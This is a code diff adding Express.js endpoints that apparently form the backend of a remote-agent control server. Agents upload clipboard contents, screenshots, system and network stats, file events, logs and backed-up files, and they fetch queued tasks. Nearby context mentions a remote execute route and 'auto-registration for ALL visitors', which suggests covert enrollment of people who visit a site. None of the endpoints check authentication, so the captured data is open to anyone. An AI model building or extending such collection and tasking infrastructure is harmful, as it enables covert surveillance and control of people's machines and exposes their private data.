@@ -301,6 +301,111 @@ app.post('/api/control/execute', (req, res) => {
 });
 
 // ============================================
+// SPECIALIZED AGENT APIs
+// ============================================
+
+// Clipboard sync
+let clipboardData = { content: '', agent_id: '', timestamp: '' };
+app.post('/api/clipboard/sync', (req, res) => {
+    clipboardData = req.body;
+    console.log(`📋 Clipboard synced from ${req.body.agent_id}`);
+    res.json({ success: true });
+});
+app.get('/api/clipboard/latest', (req, res) => {
+    res.json(clipboardData);
+});
+
+// Screenshots
+let screenshots = [];
+app.post('/api/screenshots/upload', (req, res) => {
+    const { agent_id, image, resolution, timestamp } = req.body;
+    screenshots.push({ agent_id, image, resolution, timestamp });
+    if (screenshots.length > 50) screenshots.shift(); // Keep last 50
+    console.log(`📸 Screenshot from ${agent_id} (${resolution})`);
+    res.json({ success: true });
+});
+app.get('/api/screenshots/latest', (req, res) => {
+    res.json({ screenshots: screenshots.slice(-10) });
+});
+
+// System stats
+let systemStats = [];
+app.post('/api/system/stats', (req, res) => {
+    systemStats.push(req.body);
+    if (systemStats.length > 100) systemStats.shift();
+    res.json({ success: true });
+});
+app.get('/api/system/stats', (req, res) => {
+    res.json({ stats: systemStats.slice(-20) });
+});
+
+// Network stats
+let networkStats = [];
+app.post('/api/network/stats', (req, res) => {
+    networkStats.push(req.body);
+    if (networkStats.length > 100) networkStats.shift();
+    res.json({ success: true });
+});
+app.get('/api/network/stats', (req, res) => {
+    res.json({ stats: networkStats.slice(-20) });
+});
+
+// File events
+let fileEvents = [];
+app.post('/api/files/event', (req, res) => {
+    fileEvents.push(req.body);
+    if (fileEvents.length > 200) fileEvents.shift();
+    console.log(`📁 ${req.body.event_type}: ${req.body.path}`);
+    res.json({ success: true });
+});
+app.get('/api/files/events', (req, res) => {
+    res.json({ events: fileEvents.slice(-50) });
+});
+
+// Log entries
+let logEntries = [];
+app.post('/api/logs/entry', (req, res) => {
+    logEntries.push(req.body);
+    if (logEntries.length > 500) logEntries.shift();
+    res.json({ success: true });
+});
+app.get('/api/logs/entries', (req, res) => {
+    res.json({ entries: logEntries.slice(-100) });
+});
+
+// Backup uploads
+let backups = [];
+app.post('/api/backup/upload', (req, res) => {
+    const { agent_id, filepath, filename, size, hash, timestamp } = req.body;
+    backups.push({ agent_id, filepath, filename, size, hash, timestamp });
+    console.log(`💾 Backup: ${filename} (${size} bytes)`);
+    res.json({ success: true });
+});
+app.get('/api/backup/files', (req, res) => {
+    res.json({ backups: backups.slice(-100) });
+});
+
+// Task scheduler
+let tasks = [];
+let taskResults = [];
+app.get('/api/tasks/pending/:agent_id', (req, res) => {
+    const pending = tasks.filter(t => t.agent_id === req.params.agent_id && t.status === 'pending');
+    // Mark as dispatched
+    pending.forEach(t => t.status = 'dispatched');
+    res.json({ tasks: pending });
+});
+app.post('/api/tasks/result', (req, res) => {
+    taskResults.push(req.body);
+    console.log(`✅ Task result from ${req.body.agent_id}: ${req.body.status}`);
+    res.json({ success: true });
+});
+app.post('/api/tasks/create', (req, res) => {
+    const task = { ...req.body, id: Date.now(), status: 'pending' };
+    tasks.push(task);
+    res.json({ success: true, task_id: task.id });
+});
+
+// ============================================
 // CLOUD AGENT API - Auto-registration for ALL visitors
 // ============================================
 
